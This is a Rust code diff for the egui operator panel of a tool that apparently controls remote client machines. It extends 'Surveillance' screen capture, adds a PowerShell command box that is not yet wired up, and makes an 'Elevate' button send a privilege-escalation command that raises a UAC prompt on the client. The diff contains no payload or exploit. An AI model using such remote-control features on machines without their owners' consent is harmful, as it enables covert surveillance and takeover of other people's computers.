@@ -1,7 +1,8 @@
+use core::f32;
+
 use crate::manager::types::UiManagerCommand;
 use egui::{
-    CollapsingHeader, Color32, ColorImage, Context, Frame, Id, Image, Margin, RadioButton, Stroke,
-    TextureHandle, Widget, Window,
+    Button, CollapsingHeader, Color32, ColorImage, Context, Frame, Id, Image, Margin, RadioButton, ScrollArea, Stroke, TextEdit, TextStyle, TextureHandle, Ui, Widget, Window
 };
 use shared::commands::{
     CaptureCommand, CaptureQuality, CaptureType, Command, ComputerInfoResponse, MessageBoxArgs,
@@ -50,6 +51,7 @@ pub struct ClientViewTextures {
 }
 pub struct ClientViewState {
     pub visible: bool,
+    pub powershell: String,
     pub captures: ClientViewCaptures,
     pub textures: ClientViewTextures,
     pub capturing: ClientViewCaptureState,
@@ -77,6 +79,7 @@ impl ClientView {
             socket: socket,
             state: ClientViewState {
                 visible: false,
+                powershell: String::from("echo Hello World!"),
                 captures: ClientViewCaptures {
                     screen: ClientViewCapture {
                         quality: CaptureQuality::Speed,
@@ -107,10 +110,10 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
         .open(&mut view.state.visible)
         .resizable(true)
         .show(ctx, |ui| {
-            CollapsingHeader::new("Surveillance")
+            CollapsingHeader::new("🔍  Surveillance")
                 .default_open(true)
                 .show(ui, |ui| {
-                    CollapsingHeader::new("Screen")
+                    CollapsingHeader::new("🖵  Screen")
                         .default_open(false)
                         .show(ui, |ui| {
                             if let Some(ref image) = view.state.captures.screen.data {
@@ -135,7 +138,7 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
                             }
 
                             if view.state.capturing.screen {
-                                if ui.button("Stop").clicked() {
+                                if ui.button("⏹  Stop").clicked() {
                                     println!("[*] sending CaptureCommand::Stop");
                                     let _ = view.sender.send(UiManagerCommand::SendCommand(
                                         view.mutex.clone(),
@@ -144,7 +147,7 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
                                     view.state.capturing.screen = false;
                                 }
                             } else {
-                                if ui.button("Start").clicked() {
+                                if ui.button("▶  Start").clicked() {
                                     println!("[*] sending CaptureCommand::Start");
                                     let _ = view.sender.send(UiManagerCommand::SendCommand(
                                         view.mutex.clone(),
@@ -178,10 +181,10 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
                             });
                         });
                 });
-            CollapsingHeader::new("Utility")
+            CollapsingHeader::new("🗁  Utility")
                 .default_open(true)
                 .show(ui, |ui| {
-                    CollapsingHeader::new("MessageBox")
+                    CollapsingHeader::new("💬  MessageBox")
                         .default_open(false)
                         .show(ui, |ui| {
                             ui.text_edit_singleline(&mut view.state.msgbox.title);
@@ -197,17 +200,52 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
                                 ));
                             }
                         });
-                    CollapsingHeader::new("Elevate")
+
+
+                    let mut theme = egui_extras::syntax_highlighting::CodeTheme::from_memory(ui.ctx(), ui.style());
+                    let mut layouter = |ui: &egui::Ui, buf: &dyn egui::TextBuffer, wrap_width: f32| {
+                        let mut layout_job = egui_extras::syntax_highlighting::highlight(
+                            ui.ctx(),
+                            ui.style(),
+                            &theme,
+                            buf.as_str(),
+                            "ps1",
+                        );
+                        layout_job.wrap.max_width = wrap_width;
+                        ui.fonts(|f| f.layout_job(layout_job))
+                    };
+                    CollapsingHeader::new("🗖  PowerShell").default_open(false)
+                    .show(ui, |ui| {
+                        ui.label("Input");
+                        ScrollArea::vertical().show(ui, |ui| {
+                            ui.add(TextEdit::multiline(&mut view.state.powershell)
+                        .font(TextStyle::Monospace)
+                        .code_editor()
+                        .desired_rows(8)
+                        .lock_focus(true)
+                        .desired_width(f32::INFINITY)
+                        .layouter(&mut layouter))
+                        });
+                        ui.label("Output");
+                        // ...
+                        if ui.button("Send").clicked() {};
+                    });
+                    CollapsingHeader::new("🛡  Elevate")
                         .default_open(false)
                         .show(ui, |ui| {
-                            ui.label("If UAC is enabled on the client, clicking this button will prompt the user, and requires administrative privileges.");
-                            if ui.button("Elevate").clicked() {
-                                println!("[*] we would send a command here");
+                            if !view.elevated {
+                                ui.label("If UAC is enabled on the client, clicking this button will prompt the user, and requires administrative privileges.");
+                            } else {
+                                ui.label("✔ Already elevated");
+                            }
+                            if ui.add_enabled(!view.elevated, Button::new("Send")).clicked() {
+                                let _ = view.sender.send(UiManagerCommand::SendCommand(view.mutex.clone(), Command::Elevate));
                             };
-                        })
+                        });
+                        
                 });
 
-            let disconnect = eframe::egui::Button::new("Disconnect")
+            let disconnect = eframe::egui::Button::new("✖  Disconnect")
                 .fill(Color32::DARK_RED)
                 .stroke(Stroke::new(1.0, Color32::BLACK));
             Frame::new().inner_margin(Margin::same(4)).show(ui, |ui| {
